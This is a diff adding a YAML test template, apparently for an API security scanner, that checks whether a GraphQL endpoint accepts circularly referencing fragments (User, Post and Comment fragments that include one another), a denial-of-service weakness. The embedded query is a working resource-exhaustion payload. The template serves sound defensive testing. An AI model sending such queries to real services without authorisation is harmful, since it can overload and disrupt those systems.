@@ -1,0 +1,71 @@
+id: graphql-circular-fragment-attack
+info:
+  name: "GraphQL Circular Fragment Attack"
+  category: "API4:2023 Unrestricted Resource Consumption"
+  severity: "HIGH"
+  author: "hadrian"
+  description: "Tests for circular fragment reference vulnerabilities in GraphQL. Circular or deeply nested fragments can cause infinite loops, stack overflow, or excessive processing during query parsing and execution."
+  tags: ["graphql", "dos", "fragments", "circular-reference", "recursion"]
+  requires_llm_triage: true
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: false
+
+role_selector:
+  attacker_permission_level: "all"
+  victim_permission_level: "all"
+
+graphql:
+  - query: |
+      query CircularFragments {
+        user(id: "1") {
+          ...UserFields
+        }
+      }
+
+      fragment UserFields on User {
+        id
+        name
+        posts {
+          ...PostFields
+        }
+      }
+
+      fragment PostFields on Post {
+        id
+        title
+        author {
+          ...UserFields
+        }
+        comments {
+          ...CommentFields
+        }
+      }
+
+      fragment CommentFields on Comment {
+        id
+        text
+        author {
+          ...UserFields
+        }
+        post {
+          ...PostFields
+        }
+      }
+    matchers:
+      - type: status
+        status: [200, 400, 500]
+      - type: word
+        words: ["data", "errors"]
+        part: body
+        condition: or
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "data"
+      exists: true
+  vulnerability_pattern: "graphql_circular_fragment_allowed"
